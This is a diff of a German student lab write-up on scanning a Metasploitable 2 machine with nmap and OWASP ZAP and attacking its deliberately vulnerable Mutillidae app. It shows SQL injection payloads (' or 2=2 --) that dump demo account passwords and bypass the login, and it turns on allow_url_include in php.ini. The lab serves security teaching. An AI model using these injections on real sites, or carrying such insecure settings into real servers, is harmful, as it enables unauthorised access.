@@ -1,23 +1,21 @@
-#### Thema: Zap
-### Team: David Hieselmayr
-## Datum: 31.05.2020
+# Thema: Zap
+## Team: David Hieselmayr
+### Datum: 31.05.2020
 ---
 
-### Vorbereitungen 
+## Vorbereitungen 
 
 [Link Download ZAP](https://www.zaproxy.org/download/)<br>
 [![Video](https://avatars1.githubusercontent.com/u/6716868?s=280&v=4)](https://www.youtube.com/watch?v=StTqXEQ2l-Y "Video Zap Tutorial")
 
-> root -s<br>
+> sudo -s<br>
 > sh dateiname.sh<br>
 
 Programm starten 
 
-
-> about:preferences#searchResults<br>
 > proxy Einstellung richtig konfigurieren<br>
-![Image](https://github.com/MatthiasRiener/nwtdoc/blob/master/Hieselmayr/Unbenannt.JPG)<br>
-> metasploitable 2 starten (schauen ob die netzwerkbrück aktiv ist)<br>
+![Image](https://raw.githubusercontent.com/MatthiasRiener/nwtdoc/master/Hieselmayr/Unbenannt.JPG)<br>
+> metasploitable 2 starten (schauen ob die netzwerkbrücke aktiv ist)<br>
 > ip a
 ```
 192.168.0.19
@@ -136,9 +134,42 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 35.41 seconds
 
 ```
+---
 
+## Schwachstellen mit nmap 
 
-1. Schwachstelle 
+1. **[nmap]** Schwachstelle 
+```
+21/tcp   open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+```
+2. **[nmap]** Schwachstelle 
+```
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+```
+
+--- 
+## **Aufsetzen der DB** 
+### alles auf der Metasploitable2 
+
+> cd /var/www/mutillidae<br>
+> sudo nano config.inc<br>
+```
+<?php                                                                                                           /* NOTE: On Samurai, the $dbpass password is "samurai" rather than blank */                                                                                                                                     $dbhost = 'localhost';                                                                                  $dbuser = 'root';                                                                                       $dbpass = '';                                                                                           $dbname = 'owasp10';                                                                            ?>  
+```
+> cd /etc/php5/cgi<br>
+> sudo nano php.ini <br>
+> strg + w<br>
+> fopen<br>
+```
+allow_url_include = On
+```
+// restart 
+>sudo /etc/init.d/apache2 restart
+---
+## Schwachstellen mit ZAP
+
+1. **[ZAP]** Schwachstelle 
 > http://192.168.0.19/mutillidae/passwords/accounts.txt
 ```
 'admin', 'adminpass', 'Monkey!!!
@@ -146,12 +177,110 @@ Nmap done: 1 IP address (1 host up) scanned in 35.41 seconds
 'john', 'monkey', 'I like the smell of confunk
 'ed', 'pentest', 'Commandline KungFu anyone?'
 ```
-2. Schwachstelle 
+
+2. **SQL Injection**
+> http://192.168.0.19/mutillidae/index.php?page=user-info.php <br>
+
 ```
-21/tcp   open  ftp         vsftpd 2.3.4
-|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+Name: admin'
+Password: adminpass
 ```
-3. Schwachstelle 
+=> 
 ```
-80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+SELECT * FROM accounts WHERE username='admin'' AND password='adminpass'
 ```
+User:
+```
+>' or 2=2 -- 
+```
+Password: 
+
+---
+3. **[ZED]** Schwachstelle
+
+username: 
+> ' or 2=2 -- 
+
+```
+Username=admin
+Password=adminpass
+Signature=Monkey!
+
+Username=adrian
+Password=somepassword
+Signature=Zombie Films Rock!
+
+Username=john
+Password=monkey
+Signature=I like the smell of confunk
+
+Username=jeremy
+Password=password
+Signature=d1373 1337 speak
+
+Username=bryce
+Password=password
+Signature=I Love SANS
+
+Username=samurai
+Password=samurai
+Signature=Carving Fools
+
+Username=jim
+Password=password
+Signature=Jim Rome is Burning
+
+Username=bobby
+Password=password
+Signature=Hank is my dad
+
+Username=simba
+Password=password
+Signature=I am a cat
+
+Username=dreveil
+Password=password
+Signature=Preparation H
+
+Username=scotty
+Password=password
+Signature=Scotty Do
+
+Username=cal
+Password=password
+Signature=Go Wildcats
+
+Username=john
+Password=password
+Signature=Do the Duggie!
+
+Username=kevin
+Password=42
+Signature=Doug Adams rocks
+
+Username=dave
+Password=set
+Signature=Bet on S.E.T. FTW
+
+Username=ed
+Password=pentest
+Signature=Commandline KungFu anyone?
+```
+
+---
+
+4. **Authentication Bypass** 
+
+http://192.168.0.19/mutillidae/index.php?page=login.php
+
+> username: fred' or 3=3" --<br>
+> password : 
+
+```
+SELECT * FROM accounts WHERE username='fred' or 3=3" --' AND password=''
+```
+
+>' or 2=2 -- 
+
+---
+
